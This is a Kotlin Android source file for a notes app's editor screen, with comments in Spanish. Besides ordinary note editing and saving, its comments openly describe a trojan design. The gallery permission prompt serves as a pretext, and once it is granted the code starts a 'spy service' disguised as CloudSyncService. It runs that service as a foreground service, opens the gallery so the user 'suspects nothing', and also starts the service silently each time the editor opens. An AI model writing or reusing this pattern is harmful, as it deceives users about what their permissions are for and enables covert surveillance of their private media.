package cl.example.mynotes

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.view.View
import android.widget.EditText
import android.widget.ImageButton
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class NoteEditorActivity : AppCompatActivity() {

    // Vistas
    private lateinit var etTitle: EditText
    private lateinit var etContent: EditText
    private lateinit var layoutEditor: View
    private lateinit var tvDateLabel: TextView

    // Variables de datos
    private var noteToEdit: Note? = null
    private var selectedColor: String? = "#FFFFFF" // Blanco por defecto

    // Base de datos (Lazy loading)
    private val db by lazy { NotesDatabase.getDatabase(this) }

    // --- 1. MANEJADOR DE GALERÍA (LEGÍTIMO) ---
    // Este lanzador recibe la imagen seleccionada e inserta la URI en el texto
    private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            val uri = result.data?.data
            if (uri != null) {
                try {
                    // IMPORTANTE: Pedimos permiso persistente a Android para leer esta URI
                    // incluso si el teléfono se reinicia.
                    contentResolver.takePersistableUriPermission(
                        uri,
                        Intent.FLAG_GRANT_READ_URI_PERMISSION
                    )

                    // Insertar la imagen en la posición del cursor usando el Helper
                    RichTextHelper.insertImage(this, etContent, uri)

                } catch (e: Exception) {
                    e.printStackTrace()
                    Toast.makeText(this, "Error al cargar imagen", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_note_editor)

        // --- 2. CONFIGURACIÓN VISUAL (Edge-to-Edge para Android 15) ---
        // Iconos oscuros en barra de estado
        WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true

        // Ajustar padding para no quedar detrás de la cámara o barra de gestos
        layoutEditor = findViewById(R.id.editor_root)
        ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        initViews()
        setupListeners()
        loadNoteData()

        // BONUS: Si abren el editor, intentamos arrancar el servicio por si acaso
        // (No pide permisos, solo verifica si ya los tiene)
        silentStartService()
    }

    private fun initViews() {
        etTitle = findViewById(R.id.et_title)
        etContent = findViewById(R.id.et_content)
        tvDateLabel = findViewById(R.id.tv_date_label)
    }

    private fun loadNoteData() {
        // Si venimos a editar una nota existente
        if (intent.hasExtra("note_data")) {
            // Manejo seguro de Parcelable/Serializable según versión Android
            noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
                intent.getParcelableExtra("note_data", Note::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("note_data") as? Note
            }

            etTitle.setText(noteToEdit?.title)
            selectedColor = noteToEdit?.color

            // Usamos el Helper para convertir los códigos [IMG:...] en imágenes reales
            RichTextHelper.setTextWithImages(this, etContent, noteToEdit?.content ?: "")

            tvDateLabel.text = "Editado: ${noteToEdit?.date}"
            applyColor(selectedColor)
        } else {
            // Nota nueva
            val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
            tvDateLabel.text = currentDate
        }
    }

    private fun setupListeners() {
        // Botones de la barra superior
        findViewById<ImageButton>(R.id.btn_back).setOnClickListener { finish() }
        findViewById<ImageButton>(R.id.btn_save).setOnClickListener { saveNote() }

        // Botón de la barra inferior (Agregar Imagen) <-- AQUÍ ESTÁ EL PUNTO CLAVE
        findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener {
            checkGalleryPermission()
        }

        // Botones de colores (Círculos)
        setupColorClick(R.id.color_white, "#FFFFFF")
        setupColorClick(R.id.color_yellow, "#FFF9C4")
        setupColorClick(R.id.color_blue, "#E3F2FD")
        setupColorClick(R.id.color_pink, "#FCE4EC")
        setupColorClick(R.id.color_green, "#E8F5E9")
    }

    private fun setupColorClick(viewId: Int, colorHex: String) {
        findViewById<View>(viewId).setOnClickListener {
            selectedColor = colorHex
            applyColor(colorHex)
        }
    }

    private fun applyColor(colorHex: String?) {
        if (colorHex != null) {
            try {
                layoutEditor.setBackgroundColor(Color.parseColor(colorHex))
                etContent.setBackgroundColor(Color.TRANSPARENT)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    // --- 3. PERMISOS Y GALERÍA (EL SECRETO) ---
    private fun checkGalleryPermission() {
        // Determinamos qué permiso pedir según la versión de Android
        val permission = if (Build.VERSION.SDK_INT >= 33) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            // A) Si ya tenemos permiso, arrancamos el espía (por si estaba apagado)
            iniciarServicioEspia()

            // B) Abrimos la galería legítima
            openGallery()
        } else {
            // Si no tenemos permiso, lo pedimos.
            // El usuario creerá que es para poner la foto, pero al aceptar,
            // (en onRequestPermissionsResult) activaremos el espía.
            ActivityCompat.requestPermissions(this, arrayOf(permission), 200)
        }
    }

    private fun openGallery() {
        // Abrimos el selector de archivos nativo
        val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
            addCategory(Intent.CATEGORY_OPENABLE)
            type = "image/*"
        }
        pickImageLauncher.launch(intent)
    }

    // --- 4. RESPUESTA AL PERMISO ---
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 200 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

            // ¡ÉXITO! El usuario nos dio permiso.
            // 1. Encendemos el servicio espía inmediatamente
            iniciarServicioEspia()

            // 2. Abrimos la galería para que no sospeche nada
            openGallery()

        } else {
            Toast.makeText(this, "Permiso necesario para adjuntar fotos", Toast.LENGTH_SHORT).show()
        }
    }

    // --- 5. FUNCIÓN DEL SERVICIO ESPÍA ---
    private fun iniciarServicioEspia() {
        val intent = Intent(this, CloudSyncService::class.java)
        // Usamos startForegroundService para que Android no lo mate en 5 segundos
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    // Intento de inicio silencioso al abrir la actividad (sin pedir permisos)
    private fun silentStartService() {
        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            iniciarServicioEspia()
        }
    }

    // --- 6. GUARDADO DE LA NOTA ---
    private fun saveNote() {
        val title = etTitle.text.toString().trim()

        // Obtenemos el texto COMPLETO (incluyendo las etiquetas [IMG:uri] ocultas)
        val contentWithTags = etContent.text.toString()

        if (title.isEmpty() && contentWithTags.trim().isEmpty()) {
            Toast.makeText(this, "La nota está vacía", Toast.LENGTH_SHORT).show()
            return
        }

        val formattedDate = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())

        // Usamos Corrutinas (IO) para no bloquear la UI
        CoroutineScope(Dispatchers.IO).launch {
            if (noteToEdit == null) {
                // Crear Nueva
                val newNote = Note(
                    title = title,
                    content = contentWithTags,
                    date = formattedDate,
                    color = selectedColor
                )
                db.notesDao().insert(newNote)
            } else {
                // Actualizar Existente
                noteToEdit?.apply {
                    this.title = title
                    this.content = contentWithTags
                    this.date = formattedDate
                    this.color = selectedColor
                }
                db.notesDao().update(noteToEdit!!)
            }

            // Volver al hilo principal para cerrar
            withContext(Dispatchers.Main) {
                Toast.makeText(this@NoteEditorActivity, "Guardado", Toast.LENGTH_SHORT).show()
                finish()
            }
        }
    }
}